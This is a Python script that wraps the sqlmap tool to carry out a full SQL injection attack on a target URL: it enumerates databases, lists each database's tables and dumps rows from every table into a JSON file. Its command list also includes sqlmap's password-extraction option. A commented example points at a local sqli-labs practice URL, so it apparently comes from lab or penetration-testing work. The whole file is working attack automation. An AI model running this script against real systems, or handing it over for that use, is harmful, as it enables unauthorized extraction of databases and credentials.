import subprocess
import json

common_mysql_dbs = ["information_schema", "mysql", "performance_schema"]

def __get_sql_command(target:str, command_index:int):

    sqlmap_commands = [f"sqlmap -u {target} --batch --banner",
                       f"sqlmap -u {target} --batch --passwords",
                       f"sqlmap -u {target} --batch --dbs",
                       f"sqlmap -u {target} --batch --tables -D database",
                       f"sqlmap -u {target} --batch --dump -T table -D database"]

    return sqlmap_commands[command_index]


# Runs shell code to find all databases in the target service.
def __run_find_dbs(target:str):

    # Place shell commands in correct format for subproces.run()
    # command_split = sqlmap_commands[2].split(" ")
    command_split = __get_sql_command(target, 2).split(" ")

    # Run SQLMap, store shell output in a variable.
    shell_output = subprocess.run(command_split, capture_output=True, text=True)

    return shell_output

# Retrives info such as DBMS type and list of databases.
def __parse_sqlmap_dbs_output(shell_output: str):

    dbms_type: str
    databases = []

    # Split strtings by newline
    split_output = shell_output.split("\n")

    # Strip whitespaces on the begining and end of the string.
    split_output = [item.strip() for item in split_output]

    # Recursive method for finding all DB names outputed by SQLMap tool.
    def find_db_names(item:str):

        next_item = split_output[split_output.index(item)+1]

        if "[*]" in next_item:
            next_item_split = next_item.split(" ")
            databases.append(next_item_split[1])

            find_db_names(next_item)

        else:
            return databases


    for item in split_output:

        # Find DBMS type.
        if "back-end DBMS" in item:
            dbms_type = item.split(" ")
            dbms_type = " ".join(dbms_type[2:])

        # Find DBs
        if "available databases" in item:

            if item is not split_output[-1]:
                find_db_names(item)

    databases = [db_name for db_name in databases if db_name not in common_mysql_dbs]

    return databases, dbms_type

# Runs shell code to find all tables in a given database.
def __run_find_tables(target:str, db_name: str):

    # Place shell commands in correct format for subproces.run()
    # command_split = sqlmap_commands[3].split(" ")
    command_split = __get_sql_command(target, 3).split(" ")

    # Add database name to SQLMap command.
    command_split[-1] = db_name

    # Run SQLMap, store shell output in a variable.
    shell_output = subprocess.run(command_split, capture_output=True, text=True)

    return shell_output

# Retrives all table names from a given databse.
def __parse_sqlmap_tables_output(shell_output: str):

    tables = []

    # Split strtings by newline
    split_output = shell_output.split("\n")

    # Strip whitespaces on the begining and end of the string.
    split_output = [item.strip() for item in split_output]

    # print("\n",split_output, "\n")

    # Recursive method for finding all table names outputed by SQLMap tool.
    def find_table_names(item:str):

        next_item = split_output[split_output.index(item)+1]

        if '|' in next_item:
            next_item_split = next_item.split(" ")
            tables.append(next_item_split[1])

            find_table_names(next_item)

        else:
            return tables


    for item in split_output:

        # Find tables
        if '+' in item:

            if item is not split_output[-1]:
                find_table_names(item)

    tables = list(set(tables))

    return list(tables)

# Runs shell code to dump table content.
def __run_table_dump(target:str, table_name:  str, db_name: str):

    # Place shell commands in correct format for subproces.run()
    # command_split = sqlmap_commands[4].split(" ")
    command_split = __get_sql_command(target, 4).split(" ")

    # Add database name to SQLMap command.
    command_split[-1] = db_name

    # Add table name to SQLMap command.
    command_split[-3] = table_name

    # Run SQLMap, store shell output in a variable.
    shell_output = subprocess.run(command_split, capture_output=True, text=True)

    return shell_output

#  Retrives 5 rows of a given db table.
def __parse_sqlmap_table_dump_output(shell_output: str):

    rows = []
    first_plus = True

    # Split strtings by newline
    split_output = shell_output.split("\n")

    # Strip whitespaces on the begining and end of the string.
    split_output = [item.strip() for item in split_output]

    # Return first couple of rows from the db table dump.
    for item in split_output:

        if '+' in item and first_plus:

            first_plus = False

            for i in range(1,7):

                next_item = split_output[split_output.index(item)+i]

                if '|' == next_item[0]:

                    rows.append(next_item)


    return list(rows)


# Function that runs entire SQLinjection exploit.
def run_sql_injection(target: str) -> dict:

    retrived_data = {
        "target":f"{target}",
        "dbms_type": "",
        "databases":{},
        "tables":{}
    }

    # Find all databases.
    sqlamp_dbs_output = __run_find_dbs(target)

    dbs, dbms_type = __parse_sqlmap_dbs_output(sqlamp_dbs_output.stdout)

    # Store found results in report.
    retrived_data["dbms_type"] = dbms_type
    # retrived_data["databases"] = dbs

    # Search all databases for all tables.
    for db in dbs:

        sqlmap_tables_output = __run_find_tables(target, db)

        tables_list = __parse_sqlmap_tables_output(sqlmap_tables_output.stdout)

        # Store found tables to report.
        retrived_data["databases"][db] = tables_list

        for table in tables_list:

            sqlmap_table_dump_output = __run_table_dump(target, table, db)

            rows_dump = __parse_sqlmap_table_dump_output(sqlmap_table_dump_output.stdout)

            # Store first 5 table rows to report.
            retrived_data["tables"][table] = rows_dump



    # Dump retrived data to JSON file.
    with open('dumped.json', 'w') as file:
        json.dump(retrived_data, file, indent=4)

    # print(retrived_data)

    return retrived_data


# if __name__ == '__main__':
#
#     d = run_sql_injection("localhost/sqlilabs/Less-1/?id=")
#
#     print(d)
